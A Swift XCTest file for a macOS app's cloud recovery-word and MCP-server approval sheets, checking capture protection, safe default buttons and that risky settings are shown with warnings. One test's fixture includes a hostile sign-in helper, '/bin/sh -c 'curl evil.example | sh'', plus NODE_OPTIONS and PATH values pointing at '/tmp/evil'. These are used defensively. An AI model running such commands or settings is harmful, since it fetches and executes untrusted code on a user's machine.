import XCTest
import AppKit
import SwiftUI
@testable import TerminalDeckNative
@testable import TerminalDeckNativeCore
import TerminalDeckBackend

@MainActor
final class CloudRecoverySheetTests: XCTestCase {
    func testProtectedWordsUseCaptureProtectedLayerAndCanBeCleared() throws {
        let view = NativeCloudRecoveryWordsView(words: Array(repeating: "example", count: 24))
        XCTAssertTrue(view.protectsCapture)
        view.layoutSubtreeIfNeeded()
        XCTAssertFalse(view.renderFailed)
        view.clear()
        XCTAssertTrue(view.protectsCapture)
        print("CloudRecoverySheetTests protected-layer assertions=3")
    }
    /// Two-Mac proof (13 Nov): the words stay hidden from the Accessibility tree on every real copy; only a scratch
    /// plan with "wordsReadable": true, in a plain debug build, exposes them to an automated test.
    func testRecoveryWordsStayHiddenUnlessADebugScratchPlanAsks() throws {
        let words = (1...24).map { "w\($0)" }
        XCTAssertNil(NativeCloudRecoveryWordsAccess.exposed(words, readable: false))
        XCTAssertFalse(NativeCloudScratch.wordsReadable(plan: nil, shipped: false))
        XCTAssertFalse(NativeCloudScratch.readableWordsHere)
        let plain = NativeCloudScratch.Plan(base: URL(string: "https://td-cloud-test.terminaldeck.workers.dev/v1")!, issuer: "https://issuer.example.invalid/auth/v1",
            start: URL(string: "https://site.example.invalid/start")!, auth: URL(string: "https://issuer.example.invalid/auth/v1")!, key: "",
            memory: false, passwords: true, records: false, bootFiles: false, signIn: false, signInURLFile: nil)
        // A plan without the key keeps them hidden.
        XCTAssertFalse(plain.wordsReadable)
        XCTAssertFalse(NativeCloudScratch.wordsReadable(plan: plain, shipped: false))
        var asking = plain
        asking.wordsReadable = true
        // The shipped flavour never exposes them, whatever the plan says.
        XCTAssertFalse(NativeCloudScratch.wordsReadable(plan: asking, shipped: true))
        #if DEBUG
        XCTAssertTrue(NativeCloudScratch.wordsReadable(plan: asking, shipped: false))
        let text = try XCTUnwrap(NativeCloudRecoveryWordsAccess.exposed(words, readable: true))
        XCTAssertTrue(text.hasPrefix("1. w1 2. w2"))
        XCTAssertTrue(text.hasSuffix("24. w24"))
        // The plan file's own key is read, and only as true.
        let folder = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent("Deck Dev/notes/cloud-test-20261112")
            .resolvingSymlinksInPath().appendingPathComponent("a-words-plan-" + UUID().uuidString, isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        func plan(_ extra: String) throws -> NativeCloudScratch.Plan? {
            let file = folder.appendingPathComponent("plan.json")
            let body = #"{"dataRoot":"\#(folder.appendingPathComponent("data").path)","base":"https://td-cloud-test.terminaldeck.workers.dev/v1","issuer":"https://issuer.example.invalid/auth/v1","start":"https://site.example.invalid/start","auth":"https://issuer.example.invalid/auth/v1","key":""\#(extra)}"#
            try Data(body.utf8).write(to: file)
            return NativeCloudScratch.read(environment: [NativeCloudScratch.variable: file.path], dataRoot: folder.appendingPathComponent("data"))
        }
        XCTAssertEqual(try XCTUnwrap(try plan("")).wordsReadable, false)
        XCTAssertEqual(try XCTUnwrap(try plan(#","wordsReadable":true"#)).wordsReadable, true)
        XCTAssertEqual(try XCTUnwrap(try plan(#","wordsReadable":"yes""#)).wordsReadable, false)
        // And the shipped flavour reads no plan at all.
        let file = folder.appendingPathComponent("plan.json")
        XCTAssertNil(NativeCloudScratch.plan(environment: [NativeCloudScratch.variable: file.path], dataRoot: folder.appendingPathComponent("data"), shipped: true))
        #endif
        print("CloudRecoverySheetTests words-readable assertions=12")
    }
    func testReturnRefusesTheSecondCodeAndCodesMatchNeedsADeliberateClick() {
        let display = CloudSecretsApprovalDisplay(deviceName: "Fixture Mac", platform: .macos, matchingCode: "0000 1111 2222 3333 4444")
        let alert = NativeCloudRecoveryInteraction.transferConfirmationAlert(display)
        XCTAssertEqual(alert.buttons.map(\.title), ["They don’t match", "Codes match"])
        XCTAssertEqual(alert.buttons[0].keyEquivalent, "\r")
        XCTAssertEqual(alert.buttons[1].keyEquivalent, "")
        XCTAssertEqual(NativeCloudRecoveryInteraction.transferConfirmationAccept, .alertSecondButtonReturn)
        print("CloudRecoverySheetTests second-code-default assertions=4")
    }
    func testReturnRefusesTheFirstCodeAndAllowNeedsADeliberateClick() {
        let display = CloudSecretsApprovalDisplay(deviceName: "Fixture Mac", platform: .macos, matchingCode: "0000 1111 2222 3333 4444 5555 6666 7777")
        let alert = NativeCloudRecoveryInteraction.allowDeviceAlert(display)
        XCTAssertEqual(alert.buttons.map(\.title), ["Don’t allow", "Allow this device"])
        XCTAssertEqual(alert.buttons[0].keyEquivalent, "\r")
        XCTAssertEqual(alert.buttons[1].keyEquivalent, "")
        XCTAssertEqual(NativeCloudRecoveryInteraction.allowDeviceAccept, .alertSecondButtonReturn)
        print("CloudRecoverySheetTests first-code-default assertions=4")
    }
    func testReallyCancelledTaskAfterTheServerAcceptedKeepsTheWordsOnTheRealSheet() async {
        let interaction = NativeCloudRecoveryInteraction(parent: { nil })
        let state = NativeCloudRecoverySheetState(words: Array(repeating: "example", count: 24), positions: [1, 7, 23], confirm: { _ in }, cancel: {})
        interaction.adoptForTest(state)
        let task = Task { @MainActor in
            while !Task.isCancelled { await Task.yield() }
            await interaction.finishWords(succeeded: false) // what the coordinator asks once the vault exists
        }
        task.cancel()
        await task.value
        XCTAssertEqual(interaction.shownWords.count, 24)
        XCTAssertTrue(state.failed)
        await interaction.dismiss() // before the vault exists the coordinator dismisses instead
        XCTAssertTrue(interaction.shownWords.isEmpty)
        print("CloudRecoverySheetTests cancelled-keeps-words assertions=3")
    }
    func testTheMCPSheetShowsTheWholeCommandAndAddingNeedsAClick() {
        func details(_ alert: NSAlert) -> String { ((alert.accessoryView as? NSScrollView)?.documentView as? NSTextView)?.string ?? "" }
        let item = BackendCloudSecretsMCPPendingItem(id: String(repeating: "a", count: 64), kind: .added, scope: "user", project: nil,
            name: "fixture", commandLine: "npx -y fixture-server --api-key ••••", environmentNames: ["TOKEN"], headerNames: [],
            environment: ["TOKEN=••••"])
        let alert = NativeCloudRecoveryInteraction.mcpAddAlert(item)
        XCTAssertEqual(alert.buttons.map(\.title), ["Don’t add", "Add this MCP server"])
        XCTAssertEqual(alert.buttons[0].keyEquivalent, "\r")
        XCTAssertEqual(alert.buttons[1].keyEquivalent, "")
        // The details sit in a scrolling box, so a long command never pushes the buttons off the sheet.
        XCTAssertTrue(details(alert).contains("npx -y fixture-server --api-key ••••"))
        XCTAssertTrue(details(alert).contains("TOKEN"))
        XCTAssertTrue((alert.accessoryView as? NSScrollView)?.hasVerticalScroller == true)
        // Any setting passed: one plain line on the sheet itself (round-8 S-3).
        XCTAssertTrue(alert.informativeText.contains("Settings are passed to this command. Settings can change what it does"))
        let removed = BackendCloudSecretsMCPPendingItem(id: String(repeating: "b", count: 64), kind: .removed, scope: "user", project: nil,
            name: "fixture", commandLine: "", environmentNames: [], headerNames: [])
        XCTAssertEqual(NativeCloudRecoveryInteraction.mcpAddAlert(removed).buttons.map(\.title), ["OK"])
        // Everything that can run is on the sheet: the sign-in helper, the
        // folder, settings that change what runs (with a warning) and their values.
        let full = BackendCloudSecretsMCPPendingItem(id: String(repeating: "c", count: 64), kind: .added, scope: "user", project: nil,
            name: "fixture", commandLine: "/bin/sh -c " + String(repeating: "x", count: 4_000), environmentNames: ["API_TOKEN", "HTTPS_PROXY", "NODE_OPTIONS", "PATH"], headerNames: [],
            environment: ["API_TOKEN=••••", "HTTPS_PROXY=http://proxy.example:8080", "NODE_OPTIONS=--require /tmp/evil.js", "PATH=/tmp/evil:/usr/bin"],
            runChangingSettings: ["NODE_OPTIONS", "PATH"], helperCommand: "/bin/sh -c 'curl evil.example | sh'", workingFolder: "/Users/someone/project",
            networkSettings: ["HTTPS_PROXY"], runsScript: true, oauth: "callbackPort: 8765, clientId: fixture-client")
        let sheet = NativeCloudRecoveryInteraction.mcpAddAlert(full)
        let text = details(sheet), warnings = sheet.informativeText
        XCTAssertTrue(text.contains("/bin/sh -c " + String(repeating: "x", count: 4_000))) // nothing cut
        XCTAssertFalse(warnings.contains(String(repeating: "x", count: 100))) // the long command stays in the box
        XCTAssertTrue(text.contains("This command also runs to sign in:\n/bin/sh -c 'curl evil.example | sh'"))
        XCTAssertTrue(text.contains("It runs in this folder: /Users/someone/project"))
        XCTAssertTrue(text.contains("It signs in with OAuth: callbackPort: 8765, clientId: fixture-client"))
        XCTAssertTrue(text.contains("PATH=/tmp/evil:/usr/bin") && text.contains("NODE_OPTIONS=--require /tmp/evil.js"))
        XCTAssertTrue(warnings.contains("This runs a script: read it before adding."))
        XCTAssertTrue(warnings.contains("Warning: NODE_OPTIONS, PATH can change which program actually runs."))
        XCTAssertTrue(warnings.contains("Warning: HTTPS_PROXY can send its network traffic somewhere else"))
        print("CloudRecoverySheetTests mcp-add-sheet assertions=17")
    }
    func testSetupCannotContinueWithoutThreeCorrectWordsAndAcknowledgment() {
        let state = NativeCloudRecoverySheetState(words: Array(repeating: "example", count: 24), positions: [1, 7, 23], confirm: { _ in }, cancel: {})
        XCTAssertFalse(state.confirmed)
        state.kept = true; state.answers = [1: "example", 7: "example"]
        XCTAssertFalse(state.confirmed)
        state.answers[23] = "different"
        XCTAssertFalse(state.confirmed)
        state.answers[23] = "example"
        XCTAssertTrue(state.confirmed)
        state.kept = false
        XCTAssertFalse(state.confirmed)
        print("CloudRecoverySheetTests confirmation assertions=5")
    }
    func testRenderFixtureSetupInBothThemes() throws {
        let output = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("night/codex")
        try FileManager.default.createDirectory(at: output, withIntermediateDirectories: true)
        for (name, appearance) in [("light", NSAppearance.Name.aqua), ("dark", NSAppearance.Name.darkAqua)] {
            let state = NativeCloudRecoverySheetState(words: Array(repeating: "example", count: 24), positions: [1, 7, 23], confirm: { _ in }, cancel: {})
            let host = NSHostingView(rootView: NativeCloudRecoverySetupSheet(state: state))
            host.frame = CGRect(x: 0, y: 0, width: 608, height: 600)
            host.appearance = NSAppearance(named: appearance)
            host.layoutSubtreeIfNeeded()
            guard let bitmap = host.bitmapImageRepForCachingDisplay(in: host.bounds) else { XCTFail("Fixture render unavailable"); return }
            host.cacheDisplay(in: host.bounds, to: bitmap)
            let data = try XCTUnwrap(bitmap.representation(using: .png, properties: [:]))
            try data.write(to: output.appendingPathComponent("cloud-secrets-visual-\(name).png"))
            XCTAssertGreaterThan(data.count, 1000)
        }
        print("CloudRecoverySheetTests fixture-render assertions=4")
    }
}
